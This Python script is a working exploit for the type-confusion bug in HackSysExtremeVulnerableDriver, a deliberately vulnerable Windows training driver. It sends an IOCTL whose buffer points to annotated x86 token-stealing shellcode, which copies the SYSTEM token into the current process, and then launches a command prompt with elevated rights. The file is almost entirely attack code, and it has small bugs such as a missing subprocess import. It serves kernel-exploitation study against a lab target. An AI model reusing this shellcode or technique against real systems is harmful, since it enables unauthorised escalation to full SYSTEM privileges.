import sys, os
import ctypes, struct
from ctypes import *

def type_confusion_driver_handler():

    kernel32              = windll.kernel32
    psapi                 = windll.Psapi
    ntdll                 = windll.ntdll
    
    device_handle = kernel32.CreateFileA("\\\\.\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

    if not device_handle or device_handle == -1:
        print("[!] Error creating Device handle:" + ctypes.GetLastError())
        sys.exit()
    else:
        print("[+] Device handler setup successful")
        print("[+] Device handle in use: HackSysExtremeVulnerableDriver")

    print("[+] Preparing the Ring0 Payload...")

    buffer = "\x41" * 4
    buffer += struct.pack("<L",shellcode_payload())
    
    buffer_size = len(buffer)
    buffer_pointer = id(buffer) + 20
    print("[+] Input buffer pointer address: 0x%X" % buffer_pointer)

    kernel32.DeviceIoControl(device_handle, 0x222023, buffer_pointer, buffer_size, None, 0, byref(c_ulong()), None)

    print("[+] Payload sent...")

    new_process = subprocess.Popen("start cmd", shell=True)
    print("[+] Elevated CMD prompt PID: %s" %new_process.pid)
    
def shellcode_payload():
    token_stealing_shellcode = (
        "\x60"                            # pushad
        "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                    # mov eax,[eax+0x50]
        "\x89\xc1"                        # mov ecx,eax
        "\xba\x04\x00\x00\x00"            # mov edx,0x4
        "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
        "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
        "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
        "\x75\xed"                        # jnz 0x1a
        "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
        "\x61"                            # popad
        "\x31\xC0"                        # NTSTATUS -> STATUS_SUCCESS
        "\x5D"                            # pop ebp
        "\xC2\x08\x00"                    # ret 8
        #cleanup
        "\x61"                            # popad
        "\xc3"                            # ret
    )

    shellcode_address = id(token_stealing_shellcode) + 20
    print("[+] Shellcode payloads address: 0x%X" %shellcode_address)
    print("[+] Stealing NT Authority\System token...")
    return shellcode_address

if __name__ == '__main__':
    print("\n\/\/ HEVD - Type Confusion Exploit \/\/\n")
    print("[+] Starting exploit...")
    type_confusion_driver_handler()
